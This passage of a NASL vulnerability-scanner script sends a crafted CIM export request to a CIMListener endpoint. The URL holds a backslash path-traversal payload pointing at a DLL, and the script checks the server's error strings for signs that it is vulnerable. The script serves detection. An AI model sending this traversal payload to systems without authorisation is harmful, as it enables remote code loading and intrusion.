...
xmlscript = NASLString( "<?xml version=\"1.0\" encoding=\"utf-8\" ?>" + "<CIM CIMVERSION=\"2.0\" DTDVERSION=\"2.0\">" + " <MESSAGE ID=\"1007\" PROTOCOLVERSION=\"1.0\">" + "  <SIMPLEEXPREQ>" + "    <EXPMETHODCALL NAME=\"ExportIndication\">" + "     <EXPPARAMVALUE NAME=\"NewIndication\">" + "      <INSTANCE CLASSNAME=\"CIM_AlertIndication\" >" + "        <PROPERTY NAME=\"Description\" TYPE=\"string\">" + "          <VALUE>Sample CIM_AlertIndication indication</VALUE>" + "        </PROPERTY>" + "      </INSTANCE>" + "    </EXPPARAMVALUE>" + "  </EXPMETHODCALL>" + " </SIMPLEEXPREQ>" + " </MESSAGE>" + "</CIM>" );
url = "/CIMListener/\\\\..\\\\..\\\\..\\\\..\\\\..\\\\mydll";
host = http_host_name( port: port );
req = NASLString( "M-POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/xml; charset=utf-8\\r\\n", "Content-Length: ", strlen( xmlscript ), "\\r\\n", "Man: http://www.dmtf.org/cim/mapping/http/v1.0 ; ns=40\\r\\n", "CIMOperation: MethodCall\\r\\n", "CIMExport: MethodRequest\\r\\n", "CIMExportMethod: ExportIndication\\r\\n", "\\r\\n", xmlscript, "\\r\\n" );
res = http_send_recv( port: port, data: req );
if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "CIMExport: " ) && ContainsString( res, "Cannot load module " ) && ContainsString( res, "Unknown exception" ) && !ContainsString( res, "Cannot initialize consumer due to security restrictions" ) && !ContainsString( res, "Cannot load outside cimom/bin" ) && ContainsString( res, "CIM CIMVERSION=" )){
